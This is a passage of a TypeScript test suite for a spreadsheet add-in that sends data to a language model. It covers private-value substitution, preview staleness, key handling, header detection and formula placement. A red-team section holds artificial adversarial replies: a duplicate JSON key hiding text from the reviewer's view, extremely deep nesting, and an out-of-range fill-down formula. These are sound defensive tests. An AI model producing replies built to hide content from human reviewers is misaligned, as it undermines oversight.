    if (!p.ok) throw new Error(p.message);
    const first = await flow.send(p.prepared, KEY);
    if (first.ok || !first.correction) throw new Error("expected a correction to preview");
    expect(flow.evalRecords()[0]).toMatchObject({ replyKind: "invalid", retries: 0 });
    const sent = await flow.send(first.correction, KEY);
    expect(sent).toMatchObject({ ok: false, message: "The model's reply couldn't be read. Try rephrasing." });
    expect("correction" in sent).toBe(false);
    expect(model.bodies).toHaveLength(2);
    expect(flow.history()).toEqual([]);
    expect(flow.evalRecords()[0]).toMatchObject({ replyKind: "invalid", retries: 1 });
  });

  it("an answer in structure-only mode is not accepted, and the correction goes to a preview", async () => {
    const answer = reply({ kind: "answer", formula: null, explanation: "The total is 2100." });
    const { flow, model } = await setup([answer, SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const first = await flow.send(p.prepared, KEY);
    if (first.ok || !first.correction) throw new Error("expected a correction to preview");
    expect(model.bodies).toHaveLength(1);
    const sent = await flow.send(first.correction, KEY);
    expect(sent.ok).toBe(true);
    expect(model.bodies).toHaveLength(2);
  });

  it("a correction preview goes stale like any other when the columns change before Send", async () => {
    const { flow, model } = await setup(["not json", SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const first = await flow.send(p.prepared, KEY);
    if (first.ok || !first.correction) throw new Error("expected a correction to preview");
    flow.setPolicy(0, "B", { note: "Sales region" });
    expect(flow.isCurrent(first.correction)).toBe(false);
    expect(await flow.send(first.correction, KEY)).toEqual({ ok: false, message: COPY.stalePreview });
    expect(model.bodies).toHaveLength(1);
  });

  it("clarify: shows the model's question, and the answer goes out with the earlier exchange", async () => {
    const clarify = reply({ kind: "clarify", formula: null, explanation: "Should PERSON_001 include refunds?" });
    const { flow } = await setup([clarify, SUMIFS_REPLY]);
    const p = flow.prepare("Total for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.kind).toBe("clarify");
    expect(sent.result.explanation).toBe("Should Maria Lopez include refunds?");
    expect(sent.result.canInsert).toBe(false);
    expect(sent.result.placement).toBeNull();

    const answer = flow.prepare("No, leave refunds out", "structure_only");
    if (!answer.ok) throw new Error(answer.message);
    const msgs = messagesOf(answer.prepared.built.outbound.body);
    expect(msgs).toHaveLength(4);
    expect(msgs[2]?.content).toBe(clarify);
    const second = await flow.send(answer.prepared, KEY);
    expect(second.ok).toBe(true);
    expect(flow.history()).toHaveLength(4);
  });

  it("substituted mode sends tokens in private columns and respects the row cap", async () => {
    const { flow } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Which customers are in East?", "substituted", 2);
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(true);
    const turn = JSON.parse(p.prepared.built.userContent) as { mode: string; rows: CellValue[][]; rows_sent: number; rows_total: number };
    expect(turn.mode).toBe("substituted");
    expect(turn.rows_sent).toBe(2);
    expect(turn.rows_total).toBe(6);
    expect(turn.rows).toEqual([
      ["PERSON_001", "East", 100],
      ["PERSON_002", "West", 200],
    ]);
    expect(p.prepared.built.outbound.body).not.toContain("Maria");
    expect(p.prepared.view.current?.segments.filter((s) => s.kind === "token").map((s) => s.text)).toEqual(["PERSON_001", "PERSON_002"]);
  });

  it("uses the default placement when the reply's cell is inside the selection", async () => {
    const inside = reply({
      kind: "formula",
      formula: "=C2*2",
      placement: { cell: "B2", fill_down: true },
      explanation: "Doubles Amount.",
    });
    const { flow, host } = await setup([inside]);
    const p = flow.prepare("Double the amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.placement).toEqual({ cell: "D2", fillDown: true });

    expect(await flow.insert(sent.result.id, "A3", true)).toEqual({ ok: false, message: COPY.placementInside });
    expect(await flow.insert(sent.result.id, "Sheet2!D2", true)).toEqual({ ok: false, message: COPY.placementInvalid });
    const ins = await flow.insert(sent.result.id, "D2", true);
    expect(ins).toEqual({ ok: true, message: "Inserted in D2:D7.", address: "D2:D7", check: "ok" });
    expect(host.inserts[0]).toEqual({ sheet: "Orders", cell: "D2", formula: "=C2*2", fillDown: true, lastRow: 7 });
  });

  it("asks the host for the first empty column right of the selection when it can", async () => {
    const host = fakeHost();
    const asked: unknown[][] = [];
    host.adapter.firstEmptyColumn = async (...args) => {
      asked.push(args);
      return "F";
    };
    const noPlacement = reply({ kind: "formula", formula: "=C2*2", placement: null, explanation: "Doubles Amount." });
    const { flow } = await setup([noPlacement], host);
    const p = flow.prepare("Double the amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(asked).toEqual([["Orders", 3, 2, 7]]);
    expect(sent.result.placement).toEqual({ cell: "F2", fillDown: false });
  });

  it("sending needs a key; the key is never kept in state, the log or the report", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const none = await flow.send(p.prepared, "");
    expect(none).toEqual({ ok: false, message: "Add your API key in Setup." });
    expect(model.bodies).toHaveLength(0);

    const sent = await flow.send(p.prepared, KEY);
    expect(sent.ok).toBe(true);
    expect(JSON.stringify(flow.getState())).not.toContain(KEY);
    expect(flow.exportLog()).not.toContain(KEY);
    expect(flow.exportReport()).not.toContain(KEY);
    // The same preview can't be sent twice: the history changed.
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.stalePreview });
  });

  it("sends one request at a time, and a policy change during a send keeps its exchange out of the history", async () => {
    const host = fakeHost();
    const model = fakeModel([SUMIFS_REPLY]);
    // The change lands while the request is out, after the pre-send check.
    const flow: Flow = new Flow({
      adapter: host.adapter,
      model: MODEL,
      send: (outbound, key, signal) => {
        flow.setPolicy(0, "B", { note: "Sales region" });
        return model.send(outbound, key, signal);
      },
    });
    expect((await flow.refresh()).ok).toBe(true);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const first = flow.send(p.prepared, KEY);
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.alreadySending });
    const sent = await first;
    expect(sent.ok).toBe(true);
    expect(model.bodies).toHaveLength(1);
    expect(flow.history()).toEqual([]);
  });

  it("a policy change after the preview but before the request leaves makes the preview stale: nothing is sent", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const pending = flow.send(p.prepared, KEY);
    flow.setPolicy(0, "B", { note: "Sales region" });
    expect(await pending).toEqual({ ok: false, message: COPY.stalePreview });
    expect(model.bodies).toHaveLength(0);
  });

  it("an invalid model ID is refused before anything is built", async () => {
    const { flow } = await setup();
    flow.setModel(KEY);
    expect(flow.prepare("Total Amount", "structure_only")).toEqual({ ok: false, message: COPY.modelInvalid });
    expect(flow.logEntries()).toHaveLength(0);
  });

  it("a rating and a copy are recorded on the question's record", async () => {
    const { flow } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    flow.markCopied(sent.result.id);
    flow.rate(sent.result.id, "partly");
    expect(flow.evalRecords()[0]).toMatchObject({ copied: true, rating: "partly" });
  });
});

describe("flow: request view helpers", () => {
  it("renders only tokens the session knows as chips", () => {
    const known = new Set(["PERSON_001"]);
    expect(segments('"PERSON_001" and PERSON_999', (t) => known.has(t))).toEqual([
      { kind: "text", text: '"' },
      { kind: "token", text: "PERSON_001" },
      { kind: "text", text: '" and PERSON_999' },
    ]);
  });

  it("pretty-prints short objects and rows on one line", () => {
    expect(prettyJson({ a: 1, rows: [["x", 1], ["y", 2]] })).toBe('{\n  "a": 1,\n  "rows": [\n    ["x", 1],\n    ["y", 2]\n  ]\n}');
    expect(prettyJson({ blank: 0, distinct: 4 })).toBe('{ "blank": 0, "distinct": 4 }');
    const column = { letter: "A", header: "Customer", private: true, stats: { blank: 0, distinct: 5 } };
    expect(prettyJson({ columns: [column] })).toBe(
      '{\n  "columns": [\n    { "letter": "A", "header": "Customer", "private": true, "stats": { "blank": 0, "distinct": 5 } }\n  ]\n}',
    );
  });

  it("builds the view from the exact body", () => {
    const body = JSON.stringify({
      model: MODEL,
      messages: [
        { role: "system", content: "sys" },
        { role: "user", content: JSON.stringify({ nymform: "0.1", task: "t" }) },
      ],
      max_tokens: 4000,
    });
    const v = formatRequest(body, 10, () => false);
    expect(v.model).toBe(MODEL);
    expect(v.system).toBe("sys");
    expect(v.params).toEqual([{ key: "max_tokens", value: "4000" }]);
    expect(v.current?.description).toBe(true);
    expect(v.exact).toBe(body);
  });

  it("normalizes cells and rejects anything else", () => {
    expect(normalizeCell(" $g$2 ")).toBe("G2");
    expect(normalizeCell("G0")).toBeNull();
    expect(normalizeCell("A1:B2")).toBeNull();
    expect(normalizeCell("Sheet1!A1")).toBeNull();
  });
});

// ---------------------------------------------------------------------------------------------
// Red-team regressions

/** The orders rows without their header row, as selected from row 2. */
function ordersNoHeader(): RangeData {
  return rangeData("Orders", "A2:C7", [
    ["Maria Lopez", "maria.lopez@example.com", 100],
    ["Ana Ruiz", "ana.ruiz@example.com", 200],
    ["Kenji Watanabe", "kenji.w@example.com", 300],
    ["Priya Natarajan", "priya.n@example.com", 400],
    ["Omar Haddad", "omar.h@example.com", 500],
    ["Lena Fischer", "lena.f@example.com", 600],
  ]);
}

describe("flow: a header row that is really data", () => {
  it("a selection without its header row: row 1 is treated as data, so none of it is sent as a header", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY], fakeHost(ordersNoHeader()));
    const [range] = flow.getState().ranges;
    expect(range?.hasHeaders).toBe(false);
    expect(range?.notice).toBe("Row 2 looks like data, so it's treated as data. Tick the box if it is a header row.");
    expect(range?.columns.map((c) => c.header)).toEqual(["Column A", "Column B", "Column C"]);
    expect(flow.getState().context).toMatchObject({ headerRow: 0, firstDataRow: 2, lastDataRow: 7 });

    flow.setPolicy(0, "A", { private: true });
    flow.setPolicy(0, "B", { private: true });
    const p = flow.prepare("Total amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.status.headline).toBe("Checked: no private values found");
    const sent = await flow.send(p.prepared, KEY);
    expect(sent.ok).toBe(true);
    for (const v of ["Maria Lopez", "maria.lopez@example.com", "Maria", "Lopez"]) expect(model.bodies[0]).not.toContain(v);
  });

  it("with the box ticked, a private column whose header looks like data gets a neutral alias, and the choice survives Refresh", async () => {
    const host = fakeHost(ordersNoHeader());
    const { flow, model } = await setup([SUMIFS_REPLY], host);
    flow.setHasHeaders(0, true);
    let range = flow.getState().ranges[0];
    expect(range?.hasHeaders).toBe(true);
    expect(range?.notice).toBeNull();
    expect(range?.columns[1]?.policy).toMatchObject({ private: true, alias: "Column B" });

    // Refresh keeps the user's choice (and the column's settings).
    await flow.refresh();
    range = flow.getState().ranges[0];
    expect(range?.hasHeaders).toBe(true);
    expect(range?.columns[1]?.policy.alias).toBe("Column B");

    // A column made private later gets the same default.
    flow.setPolicy(0, "C", { private: true });
    expect(flow.getState().ranges[0]?.columns[2]?.policy.alias).toBe("Column C");
    flow.setPolicy(0, "C", { alias: "Amount" });
    expect(flow.getState().ranges[0]?.columns[2]?.policy.alias).toBe("Amount");

    const p = flow.prepare("Total amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(true);
    expect(await flow.send(p.prepared, KEY)).toMatchObject({ ok: true });
    expect(model.bodies[0]).not.toContain("maria.lopez@example.com");
  });

  it("without a choice, Refresh from selection looks at row 1 again; after unticking, it keeps the choice", async () => {
    const host = fakeHost();
    const { flow } = await setup([], host);
    expect(flow.getState().ranges[0]?.hasHeaders).toBe(true);
    host.select(ordersNoHeader());
    await flow.refresh();
    expect(flow.getState().ranges[0]?.hasHeaders).toBe(false);
    host.select(orders());
    await flow.refresh();
    expect(flow.getState().ranges[0]?.hasHeaders).toBe(true);
    flow.setHasHeaders(0, false);
    expect(flow.getState().ranges[0]?.notice).toBeNull();
    await flow.refresh();
    expect(flow.getState().ranges[0]?.hasHeaders).toBe(false);
  });

  it("Refresh keeps the header choice only for the same range; another selection is checked again", async () => {
    const host = fakeHost(ordersNoHeader());
    const { flow, model } = await setup([SUMIFS_REPLY], host);
    flow.setHasHeaders(0, true);
    await flow.refresh();
    expect(flow.getState().ranges[0]).toMatchObject({ hasHeaders: true, notice: null });

    // The same address on another sheet is another range.
    host.select({ ...ordersNoHeader(), sheet: "Regions" });
    await flow.refresh();
    expect(flow.getState().ranges[0]).toMatchObject({ hasHeaders: false });

    // Other rows of the same sheet: row 3 is data too, and the notice is back.
    const rest = rangeData("Orders", "A3:C7", ordersNoHeader().values.slice(1));
    host.select(ordersNoHeader());
    await flow.refresh();
    flow.setHasHeaders(0, true);
    host.select(rest);
    await flow.refresh();
    const range = flow.getState().ranges[0];
    expect(range?.hasHeaders).toBe(false);
    expect(range?.notice).toBe("Row 3 looks like data, so it's treated as data. Tick the box if it is a header row.");
    expect(range?.columns.map((c) => c.header)).toEqual(["Column A", "Column B", "Column C"]);

    const p = flow.prepare("Total amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(await flow.send(p.prepared, KEY)).toMatchObject({ ok: true });
    for (const v of ["Ana Ruiz", "ana.ruiz@example.com"]) expect(model.bodies[0]).not.toContain(v);
  });

  it("un-marking a column drops the automatic alias for a header that looks like data, but keeps a typed one", async () => {
    const { flow } = await setup([], fakeHost(ordersNoHeader()));
    flow.setHasHeaders(0, true);
    const policyB = () => flow.getState().ranges[0]?.columns[1]?.policy;
    expect(policyB()).toMatchObject({ private: true, alias: "Column B" });

    flow.setPolicy(0, "B", { private: false });
    expect(policyB()?.private).toBe(false);
    expect(policyB()?.alias).toBeUndefined();

    // Private again: the automatic alias comes back, and it survives Refresh of the same range.
    flow.setPolicy(0, "B", { private: true });
    expect(policyB()?.alias).toBe("Column B");
    await flow.refresh();
    flow.setPolicy(0, "B", { private: false });
    expect(policyB()?.alias).toBeUndefined();

    // An alias the user typed stays, even when it reads the same as the automatic one.
    flow.setPolicy(0, "B", { private: true });
    flow.setPolicy(0, "B", { alias: "Contact" });
    flow.setPolicy(0, "B", { private: false });
    expect(policyB()?.alias).toBe("Contact");
    flow.setPolicy(0, "B", { private: true, alias: "Column B" });
    flow.setPolicy(0, "B", { private: false });
    expect(policyB()?.alias).toBe("Column B");
  });

  it("a year header made private and then not private is sent as it is, and the request isn't blocked", async () => {
    const rows: CellValue[][] = [["Account", 2023, 2024]];
    ["Rent", "Payroll", "Travel", "Software", "Marketing", "Utilities"].forEach((a, i) => rows.push([a, 10000 + i * 1375, 11000 + i * 1450]));
    const { flow } = await setup([], fakeHost(rangeData("Budget 2024", "A1:C7", rows)));
    flow.setHasHeaders(0, true);
    flow.setPolicy(0, "C", { private: true });
    flow.setPolicy(0, "C", { private: false });
    expect(flow.getState().ranges[0]?.columns[2]?.policy.alias).toBeUndefined();
    const p = flow.prepare("Total per Account", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(true);
  });

  it("the automatic alias uses the same check as row 1: an ID-shaped header over amounts is a header", async () => {
    const staff = rangeData("Staff", "A1:B4", [
      ["Employee", "FY2024"],
      ["Maria Lopez", 83500],
      ["Ana Ruiz", 91250],
      ["Kenji Watanabe", 77000],
    ]);
    const { flow, model } = await setup([SUMIFS_REPLY], fakeHost(staff));
    expect(flow.getState().ranges[0]).toMatchObject({ hasHeaders: true, notice: null });
    flow.setPolicy(0, "B", { private: true });
    expect(flow.getState().ranges[0]?.columns[1]?.policy.alias).toBeUndefined();
    const p = flow.prepare("Total FY2024", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(await flow.send(p.prepared, KEY)).toMatchObject({ ok: true });
    expect(model.bodies[0]).toContain("FY2024");
  });

  it("a lookup range added without a choice gets the same check; an explicit choice is kept", async () => {
    const host = fakeHost();
    const lookup = rangeData("Regions", "A2:B5", [
      ["East", 4.5],
      ["West", 3.25],
      ["North", 2],
      ["South", 1.75],
    ]);
    host.adapter.readRange = async (full) => {
      if (full === "Regions!A2:B5") return lookup;
      if (full === "Regions!A1:B5") return regions();
      throw new Error("no such range");
    };
    const { flow } = await setup([], host);
    expect((await flow.addContextRange("Regions!A2:B5")).ok).toBe(true);
    let st = flow.getState();
    expect(st.ranges[1]?.hasHeaders).toBe(false);
    expect(st.ranges[1]?.notice).toBe("Row 2 looks like data, so it's treated as data. Tick the box if it is a header row.");
    expect((await flow.addContextRange("Regions!A1:B5", true)).ok).toBe(true);
    st = flow.getState();
    expect(st.ranges[2]?.hasHeaders).toBe(true);
    expect(st.ranges[2]?.notice).toBeNull();
    await flow.refresh();
    expect(flow.getState().ranges.map((r) => r.hasHeaders)).toEqual([true, false, true]);
  });
});

describe("flow: fill down", () => {
  const doubled = (cell: string) =>
    reply({ kind: "formula", formula: "=C2*2", placement: { cell, fill_down: true }, explanation: "Doubles Amount on each row." });

  it("uses the model's column but starts at the first data row", async () => {
    const { flow, host } = await setup([doubled("E1")]);
    const p = flow.prepare("Double the amount on each row", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.placement).toEqual({ cell: "E2", fillDown: true });

    // The model's row, typed back in, is refused: every copy would read the next row.
    expect(await flow.insert(sent.result.id, "E1", true)).toEqual({
      ok: false,
      message: "Fill down starts at the first data row, E2. Change the cell or turn off Fill down.",
    });
    expect(host.inserts).toEqual([]);
    expect(await flow.insert(sent.result.id, "E2", true)).toMatchObject({ ok: true, address: "E2:E7" });
    // Without Fill down, any cell outside the ranges will do.
    expect(await flow.insert(sent.result.id, "E1", false)).toMatchObject({ ok: true, address: "E1" });
  });

  it("a model cell above the selection, in one of its columns, falls back to the default", async () => {
    const staff = rangeData("Staff", "A3:C6", [
      ["Name", "Dept", "Salary"],
      ["Maria Lopez", "Ops", 91000],
      ["Kenji Watanabe", "Eng", 88000],
      ["Priya Natarajan", "Ops", 97000],
    ]);
    const into = reply({ kind: "formula", formula: "=C4*2", placement: { cell: "A1", fill_down: true }, explanation: "Doubles Salary." });
    const { flow, host } = await setup([into], fakeHost(staff));
    const p = flow.prepare("Double the salary", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.placement).toEqual({ cell: "D4", fillDown: true });
    expect(await flow.insert(sent.result.id, "A1", true)).toMatchObject({ ok: false, message: COPY.fillStart("A4") });
    expect(await flow.insert(sent.result.id, "A4", true)).toEqual({ ok: false, message: COPY.placementInside });
    expect(host.inserts).toEqual([]);
  });

  it("refuses a fill whose span runs into a lookup range on the same sheet", async () => {
    const main = rangeData("Staff", "A1:C10", [
      ["Name", "Dept", "Salary"],
      ...Array.from({ length: 9 }, (_, i) => [`Person ${i}`, i % 2 ? "Ops" : "Eng", 80000 + i * 1000]),
    ]);
    const lookup = rangeData("Staff", "E3:F5", [
      ["Dept", "Bonus"],
      ["Ops", 0.1],
      ["Eng", 0.12],
    ]);
    const host = fakeHost(main);
    host.adapter.listSheets = async () => ["Staff"];
    host.adapter.readRange = async (full) => (full.endsWith("E3:F5") ? lookup : main);
    const e2 = reply({ kind: "formula", formula: "=C2*2", placement: { cell: "E2", fill_down: true }, explanation: "Doubles Salary." });
    const { flow } = await setup([e2], host);
    expect((await flow.addContextRange("E3:F5")).ok).toBe(true);
    const p = flow.prepare("Double the salary", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    // E2:E10 crosses E3:E5, so the model's column isn't used.
    expect(sent.result.placement).toEqual({ cell: "D2", fillDown: true });
    for (const confirmedSpan of [undefined, "E2:E10"]) {
      expect(await flow.insert(sent.result.id, "E2", true, confirmedSpan ? { confirmedSpan } : {})).toEqual({
        ok: false,
        message: COPY.placementInside,
      });
    }
    expect(host.inserts).toEqual([]);
    expect(await flow.insert(sent.result.id, "D2", true)).toMatchObject({ ok: true, address: "D2:D10" });
  });

  it("checks every filled copy: a range without $ that moves out of the selection is blocked", async () => {
    const share = reply({ kind: "formula", formula: "=C2/SUM(C2:C7)", placement: { cell: "D2", fill_down: true }, explanation: "Share of the total." });
    const { flow, host } = await setup([share]);
    const p = flow.prepare("Share of the total amount per row", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.canInsert).toBe(true); // fine as written in one cell
    const r = await flow.insert(sent.result.id, "D2", true);
    expect(r).toMatchObject({ ok: false, message: "Blocked: when filled down, this formula refers outside your ranges." });
    expect(r.ok ? [] : (r.reasons ?? [])).not.toHaveLength(0);
    expect(host.inserts).toEqual([]);
    expect(await flow.insert(sent.result.id, "D2", false)).toMatchObject({ ok: true, address: "D2" });
  });

  it("names the span Fill down writes", () => {
    expect(fillSpan("g2", 501)).toBe("G2:G501");
    expect(fillSpan("G501", 501)).toBeNull();
    expect(fillSpan("not a cell", 501)).toBeNull();
  });
});

describe("flow: overwrite confirmation", () => {
  it("a confirmation counts only for the span it was given for", async () => {
    const host = fakeHost();
    const occupied = new Set(["D2", "D3", "E2"]);
    host.adapter.isRangeEmpty = async (_sheet, address) => {
      const rect = parseLocalRange(address)!;
      for (const cell of occupied) {
        const at = parseLocalRange(cell)!;
        if (at.r1 >= rect.r1 && at.r1 <= rect.r2 && at.c1 >= rect.c1 && at.c1 <= rect.c2) return false;
      }
      return true;
    };
    const doubled = reply({ kind: "formula", formula: "=C2*2", placement: { cell: "D2", fill_down: false }, explanation: "Doubles Amount." });
    const { flow } = await setup([doubled], host);
    const p = flow.prepare("Double the amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    const id = sent.result.id;

    expect(await flow.insert(id, "D2", false)).toMatchObject({ ok: false, needsConfirm: true, span: "D2" });
    // The user confirmed D2, then turned on Fill down: D2:D7 is asked about again.
    expect(await flow.insert(id, "D2", true, { confirmedSpan: "D2" })).toEqual({
      ok: false,
      needsConfirm: true,
      span: "D2:D7",
      message: "D2:D7 already has values. Insert anyway to replace them; Excel can't undo this.",
    });
    // ... or changed the cell.
    expect(await flow.insert(id, "E2", false, { confirmedSpan: "D2" })).toMatchObject({ ok: false, needsConfirm: true, span: "E2" });
    expect(host.inserts).toEqual([]);
    expect(await flow.insert(id, "D2", true, { confirmedSpan: "D2:D7" })).toMatchObject({ ok: true, address: "D2:D7" });
    expect(host.inserts).toHaveLength(1);
  });

  it("without an emptiness check on the host, Insert asks before any write", async () => {
    const host = fakeHost();
    delete host.adapter.isRangeEmpty;
    const { flow } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(await flow.insert(sent.result.id, "D2", false)).toEqual({
      ok: false,
      needsConfirm: true,
      span: "D2",
      message: "Couldn't check whether D2 is empty. Insert anyway to replace anything there; Excel can't undo this.",
    });
    expect(host.inserts).toEqual([]);
    expect(await flow.insert(sent.result.id, "D2", false, { confirmedSpan: "D2" })).toMatchObject({ ok: true });
  });
});

describe("flow: the formatted view shows what is sent", () => {
  it("an earlier reply that JSON.parse would change (a repeated key, a long number) is shown as sent", async () => {
    const first =
      '{"kind":"clarify","formula":null,"placement":null,' +
      '"explanation":"HIDDEN-FROM-FORMATTED-VIEW: text the reviewer never sees",' +
      '"ref":12345678901234567890123,' +
      '"explanation":"Which region do you mean?","assumptions":[]}';
    const { flow } = await setup([first]);
    const p1 = flow.prepare("Total Amount for the region", "structure_only");
    if (!p1.ok) throw new Error(p1.message);
    expect((await flow.send(p1.prepared, KEY)).ok).toBe(true);
    const p2 = flow.prepare("East", "structure_only");
    if (!p2.ok) throw new Error(p2.message);
    const earlier = p2.prepared.view.earlier.find((m) => m.role === "assistant");
    const shown = earlier?.segments.map((s) => s.text).join("");
    expect(shown).toBe(first);
    // A turn that reads back exactly is still formatted.
    expect(p2.prepared.view.earlier[0]?.description).toBe(true);
  });

  it("a deeply nested earlier reply is shown as raw text and doesn't stop the next preview", async () => {
    const depth = 5000;
    const deep = `{"kind":"clarify","formula":null,"placement":null,"explanation":"Which region?","assumptions":[],"x":${"[".repeat(depth)}1${"]".repeat(depth)}}`;
    const { flow } = await setup([deep]);
    const p1 = flow.prepare("Total Amount for the region", "structure_only");
    if (!p1.ok) throw new Error(p1.message);
    expect((await flow.send(p1.prepared, KEY)).ok).toBe(true);
    const p2 = flow.prepare("East", "structure_only");
    if (!p2.ok) throw new Error(p2.message);
    const earlier = p2.prepared.view.earlier.find((m) => m.role === "assistant");
    expect(earlier?.segments.map((s) => s.text).join("")).toBe(deep);
  });

  it("prettyJson gives up past 20 levels of nesting", () => {
    let v: unknown = 1;
    for (let i = 0; i < 20; i++) v = [v, 2];
    expect(typeof prettyJson(v)).toBe("string");
    expect(prettyJson([v])).toBeNull();
    expect(prettyJson(JSON.parse(`${"[".repeat(100000)}1${"]".repeat(100000)}`))).toBeNull();
  });
});

// ---------------------------------------------------------------------------------------------
// Parts of private values typed in the question

describe("flow: a part of a private value in the question", () => {
  function twoMarias(): RangeData {
    return rangeData("Orders", "A1:C6", [
      ["Customer", "Region", "Amount"],
      ["Maria Lopez", "East", 100],
      ["Maria Chen", "West", 200],
      ["Kenji Watanabe", "East", 300],
      ["Maria Lopez", "East", 500],
      ["Omar Haddad", "East", 600],
    ]);
  }

  function withSelect(host: ReturnType<typeof fakeHost>) {
    const selections: { sheet: string; cells: readonly string[] }[] = [];
    host.adapter.selectCells = async (sheet, cells) => {
      selections.push({ sheet, cells });
    };
    return selections;
  }

  const taskOf = (body: string) => (JSON.parse(messagesOf(body).at(-1)!.content) as { task: string }).task;

  it("reads a part with one candidate as that value's stand-in, and says so", async () => {
    const { flow } = await setup();
    const p = flow.prepare("Total Amount for Kenji", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(true);
    expect(p.prepared.sentQuestion).toMatch(/^Total Amount for PERSON_\d{3}$/u);
    expect(p.prepared.partial.pending).toEqual([]);
    expect(p.prepared.partial.auto).toEqual([
      { key: "kenji", fragment: "Kenji", values: ["Kenji Watanabe"], tokens: [p.prepared.sentQuestion.slice(-10)] },
    ]);
    if (!p.prepared.outcome.ok) throw new Error("blocked");
    expect(p.prepared.outcome.outbound.body).not.toContain("Kenji");
  });

  it("asks which value a part with several candidates means, and blocks until then", async () => {
    const host = fakeHost(twoMarias());
    const { flow, model } = await setup([], host);
    const p = flow.prepare("Orders from Maria", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(false);
    expect(p.prepared.sentQuestion).toBe("Orders from Maria");
    const [m] = p.prepared.partial.pending;
    expect(m?.fragment).toBe("Maria");
    expect(m?.candidates.map((c) => [c.value, c.count, c.places[0]?.cells])).toEqual([
      ["Maria Lopez", 2, ["A2", "A5"]],
      ["Maria Chen", 1, ["A3"]],
    ]);
    expect((await flow.send(p.prepared, KEY)).ok).toBe(false);
    expect(model.bodies).toHaveLength(0);
    // The candidates stay in the pane: the log keeps no body for a blocked request.
    expect(flow.exportLog()).not.toContain("Maria");
  });

  it("puts the chosen stand-ins in the question, one or several, and the check passes", async () => {
    const host = fakeHost(twoMarias());
    const { flow } = await setup([], host);
    const first = flow.prepare("Orders from Maria", "structure_only");
    if (!first.ok) throw new Error(first.message);
    const [lopez, chen] = first.prepared.partial.pending[0]!.candidates;

    const one = flow.prepare("Orders from Maria", "structure_only", 50, new Map([["maria", [chen!.token]]]));
    if (!one.ok || !one.prepared.outcome.ok) throw new Error("expected a pass");
    expect(one.prepared.sentQuestion).toBe(`Orders from ${chen!.token}`);
    expect(one.prepared.partial.chosen).toEqual([{ key: "maria", fragment: "Maria", values: ["Maria Chen"], tokens: [chen!.token] }]);
    expect(one.prepared.partial.pending).toEqual([]);
    expect(taskOf(one.prepared.outcome.outbound.body)).toBe(`Orders from ${chen!.token}`);

    const both = flow.prepare("Orders from Maria", "structure_only", 50, new Map([["maria", [lopez!.token, chen!.token]]]));
    if (!both.ok || !both.prepared.outcome.ok) throw new Error("expected a pass");
    expect(both.prepared.sentQuestion).toBe(`Orders from ${lopez!.token} or ${chen!.token}`);
    expect(both.prepared.outcome.outbound.body).not.toContain("Maria");
  });

  it("keeps a part as typed when asked (then the check blocks it), and ignores stand-ins that aren't candidates", async () => {
    const host = fakeHost(twoMarias());
    const { flow } = await setup([], host);
    const kept = flow.prepare("Orders from Maria", "structure_only", 50, new Map([["maria", []]]));
    if (!kept.ok) throw new Error(kept.message);
    expect(kept.prepared.outcome.ok).toBe(false);
    expect(kept.prepared.partial.kept).toEqual([{ key: "maria", fragment: "Maria" }]);
    expect(kept.prepared.partial.pending).toEqual([]);

    const bogus = flow.prepare("Orders from Maria", "structure_only", 50, new Map([["maria", ["PERSON_999"]]]));
    if (!bogus.ok) throw new Error(bogus.message);
    expect(bogus.prepared.outcome.ok).toBe(false);
    expect(bogus.prepared.partial.pending.map((m) => m.fragment)).toEqual(["Maria"]);
